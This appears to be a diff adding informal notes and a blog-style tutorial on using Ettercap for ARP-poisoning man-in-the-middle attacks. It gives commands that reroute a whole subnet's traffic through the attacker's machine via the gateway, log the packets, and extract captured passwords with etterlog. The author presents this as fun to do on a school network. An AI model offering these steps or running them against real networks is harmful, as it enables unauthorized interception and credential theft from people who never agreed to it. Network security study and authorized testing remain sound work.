@@ -1,0 +1,120 @@
+EtterCAP
+spoofs ARP Requests.
+
+open terminal
+sudo ettercap -G for GTK Interface
+
+T <- for Text interface
+C <- for Ncurses interface
+G <- for GTK interface
+
+add two devices on local network
+your router, and some other hosts available from list.
+
+Ettercap MITM Menu
+
+ARP , NDP poisoning
+icmp redirect
+port stealing
+dhcp spoofing
+stop mitm attack(s)
+ssl intercept.
+
+
+choose arp poisoning
+
+---------------------
+Playing in schools network is kind of fun ;-).You might have heard about cain , it for windoze to play around in network.
+
+Gnu/Linux got a more cool tool called ettercap (i have been using it for years) get it from ettercap.sourceforge.net.
+
+Fedora Guys could install it with “yum install ettercap”
+
+Getting Started with Ettercap:
+
+i mostly work in runlevel 3, if not open up terminal (or ctrl+alt+f1 ;)) Switch to root user, because normal users cannot open raw sockets i guess. (correct me if i am wrong)
+
+Just type: “ettercap”
+
+It will ask you to select an user interface.
+
+ettercap NG-0.7.3 copyright 2001-2004 ALoR & NaGA
+
+Please select an User Interface
+
+Here Interface refers to whether you want “Text” interface or “Ncurses” interface or “Gtk” interface.As we are working in terminal we use text interface (I am a command freak )
+
+T <- for Text interface
+C <- for Ncurses interface
+G <- for GTK interface
+
+we are going to use T. Type:”ettercap -T” in terminal.
+
+You will see contents of packets being printed on your terminal so we started listening to the active interface.Any time press ‘q’ to quit ettercap its the safest way to quit ettercap (no ctrl+c please, its deprecated )
+
+Now Type: “ettercap -Tq”
+
+What we are doing is, asking ettercap to be quiet, “Hey ettercap don’t sh*t on my screen by printing the contents of each packet you capture”
+
+Network Interface Selection:
+
+A computer might have more than one network interfaces like your wired lan, wireles lan,loopback interface and so on.
+
+ettercap can work on any interfaces, all we have to is tell ettercap which network interface to use.
+
+To list the available network interfaces
+
+Type “ettercap -Tq -I”
+
+ettercap NG-0.7.3 copyright 2001-2004 ALoR & NaGA
+
+List of available Network Interfaces:
+
+eth0 eth0
+lo Local Loopback
+
+so, we have two network interfaces eth0 and lo.
+
+To select the network interface use “ettercap -Tq -i eth0”, i have selected my wired lan so that ettercap will listen and sniff packets.
+
+If you are those windoze user, i am sorry you have to deal with odd network interface names.
+
+Man in the niddle attack with ettercap:
+
+Type:”ettercap -Tq -i eth0 -M arp:remote /target-range1/ /target-range2/
+
+The packets between target-range1 and target-range will be hijacked and they will be going through our machine (magic of arp-cache-poisoning)
+
+Example:”ettercap -Tq -i eth0 -M arp:remote /192.168.1.1/ //”
+
+Let 192.168.1.1 is the gateway of our network,then all the packets between the gateway and all the machines in the subnet will be going through our machine (i.e we are the gateway for all the machines 😛 )
+
+Another Example:”ettercap -Tq -i eth0 -M arp:remote /192.168.1.12-25/ /192.168.1.26-50/
+
+We could specify range of ip address.
+
+Packet Logging:
+
+type:”ettercap -Tq -L dump -i eth0″
+
+Two files will be created dump.eci and dump.ecp these files can be analysed with etterlog 😉 .
+
+type:”etterlog dump.eci”
+
+It will display the connection details of dumped packets.
+
+type:”etterlog -p dump.eci”
+
+It will display the passwords captured if any 😉
+
+man etterlog for more details.
+
+Some people might want to view the captured packets in more cool protocol analyser like wireshark, but you cannot open dump.eci and dump.ecp with wireshark.To do so you have to save the packets in pcap (tcpdump) format.
+
+use “ettercap -Tq -w dump -i eth0”
+
+After completing packet capture you could directly open the dump using wireshark.
+
+converting from pcap format to etterlog format:
+
+Type:”ettercap -Tq -L dump -r pcap” where pcap is the packet dump file we just saved in tcpdump format.
